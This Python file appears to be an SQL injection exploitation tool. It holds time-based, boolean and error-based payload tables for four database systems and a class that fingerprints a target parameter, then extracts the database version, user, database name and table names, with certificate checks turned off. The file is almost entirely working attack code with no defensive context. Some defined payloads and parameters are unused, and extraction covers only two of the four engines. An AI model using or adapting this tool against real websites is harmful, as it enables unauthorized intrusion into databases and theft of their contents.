import re, time, json
from typing import Optional, Dict
import requests

DB_VERSION_QUERIES = {
    "mysql": ["SELECT @@version", "SELECT VERSION()"],
    "mssql": ["SELECT @@version"],
    "postgresql": ["SELECT version()"],
    "oracle": ["SELECT banner FROM v$version WHERE rownum=1"],
}

DB_USER_QUERIES = {
    "mysql": ["SELECT user()", "SELECT CURRENT_USER()"],
    "mssql": ["SELECT user_name()", "SELECT suser_name()"],
    "postgresql": ["SELECT current_user", "SELECT user"],
    "oracle": ["SELECT user FROM dual"],
}

DB_DATABASE_QUERIES = {
    "mysql": ["SELECT database()", "SELECT schema()"],
    "mssql": ["SELECT db_name()"],
    "postgresql": ["SELECT current_database()"],
    "oracle": ["SELECT ora_database_name FROM dual", "SELECT name FROM v$database"],
}

DB_TABLE_QUERIES = {
    "mysql": ["SELECT table_name FROM information_schema.tables LIMIT 5"],
    "mssql": ["SELECT table_name FROM information_schema.tables"],
    "postgresql": ["SELECT table_name FROM information_schema.tables LIMIT 5"],
    "oracle": ["SELECT table_name FROM all_tables WHERE rownum<=5"],
}

DB_COLUMN_QUERIES = {
    "mysql": ["SELECT column_name FROM information_schema.columns WHERE table_name='%s' LIMIT 5"],
    "mssql": ["SELECT column_name FROM information_schema.columns WHERE table_name='%s'"],
    "postgresql": ["SELECT column_name FROM information_schema.columns WHERE table_name='%s' LIMIT 5"],
    "oracle": ["SELECT column_name FROM all_tab_columns WHERE table_name='%s' AND rownum<=5"],
}

DB_DATA_QUERIES = {
    "mysql": ["SELECT * FROM %s LIMIT 3"],
    "mssql": ["SELECT TOP 3 * FROM %s"],
    "postgresql": ["SELECT * FROM %s LIMIT 3"],
    "oracle": ["SELECT * FROM %s WHERE rownum<=3"],
}

TIME_PAYLOADS = {
    "mysql": "' OR IF(1=1,SLEEP(%d),0)-- ",
    "mssql": "'; IF(1=1) WAITFOR DELAY '0:0:%d'-- ",
    "postgresql": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(%d) END-- ",
    "oracle": "' OR (SELECT CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',%d) ELSE NULL END FROM DUAL)-- ",
}

TIME_SLEEP_DURATION = 2

BOOL_PAYLOADS = {
    "mysql": ("' AND 1=1-- ", "' AND 1=2-- "),
    "mssql": ("' AND 1=1-- ", "' AND 1=2-- "),
    "postgresql": ("' AND 1=1-- ", "' AND 1=2-- "),
    "oracle": ("' AND 1=1-- ", "' AND 1=2-- "),
}

ERROR_PAYLOADS = {
    "mysql": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(%s)))-- ",
    "mssql": "' AND 1=CONVERT(INT,(%s))-- ",
    "postgresql": "' AND 1=CAST((%s) AS INT)-- ",
    "oracle": "' AND 1=CTXSYS.DRITHSX.SN(1,(%s))-- ",
}


class BlindSQLiExploiter:
    def __init__(self, sess: Optional[requests.Session] = None, timeout: float = 10.0):
        self.sess = sess or requests.Session()
        self.timeout = timeout
        self.dbms = None

    def _fingerprint(self, url: str, param: str) -> Optional[str]:
        for dbms in TIME_PAYLOADS:
            tpl = TIME_PAYLOADS[dbms]
            payload = tpl % TIME_SLEEP_DURATION
            try:
                sep = "&" if "?" in url else "?"
                start = time.time()
                self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                              timeout=self.timeout + 2, verify=False)
                elapsed = time.time() - start
                if elapsed >= TIME_SLEEP_DURATION * 0.8:
                    self.dbms = dbms
                    return dbms
            except:
                pass
        return None

    def _inject_query(self, url: str, param: str, query: str) -> Optional[str]:
        if self.dbms == "mysql":
            error_tpl = ERROR_PAYLOADS["mysql"]
            payload = error_tpl % query.replace(" ", "+")
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                                  timeout=self.timeout, verify=False)
                m = re.search(r'~(.+?)[\'"]', r.text)
                if m:
                    return m.group(1)[:100]
            except:
                pass
        elif self.dbms == "mssql":
            error_tpl = ERROR_PAYLOADS["mssql"]
            payload = error_tpl % query
            try:
                sep = "&" if "?" in url else "?"
                r = self.sess.get("%s%s%s=%s" % (url, sep, param, payload),
                                  timeout=self.timeout, verify=False)
                m = re.search(r'Conversion failed.*\'(.+?)\'', r.text)
                if m:
                    return m.group(1)[:100]
            except:
                pass
        return None

    def extract_string(self, url: str, param: str, query: str) -> Optional[str]:
        return self._inject_query(url, param, query)

    def run(self, url: str, param: str) -> Dict:
        result = {
            "dbms": None,
            "version": None,
            "user": None,
            "database": None,
            "tables": [],
            "columns": [],
            "data": [],
        }

        self.dbms = self._fingerprint(url, param)
        if not self.dbms:
            return result
        result["dbms"] = self.dbms

        for q in DB_VERSION_QUERIES.get(self.dbms, []):
            v = self.extract_string(url, param, q)
            if v:
                result["version"] = v
                break

        for q in DB_USER_QUERIES.get(self.dbms, []):
            u = self.extract_string(url, param, q)
            if u:
                result["user"] = u
                break

        for q in DB_DATABASE_QUERIES.get(self.dbms, []):
            d = self.extract_string(url, param, q)
            if d:
                result["database"] = d
                break

        for q in DB_TABLE_QUERIES.get(self.dbms, []):
            t = self.extract_string(url, param, q)
            if t:
                result["tables"] = [x.strip() for x in t.replace("\n", ",").split(",") if x.strip()]

        return result


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False,
          post_data: dict = None) -> Dict:
    exploiter = BlindSQLiExploiter(sess, timeout)
    return exploiter.run(url, param)
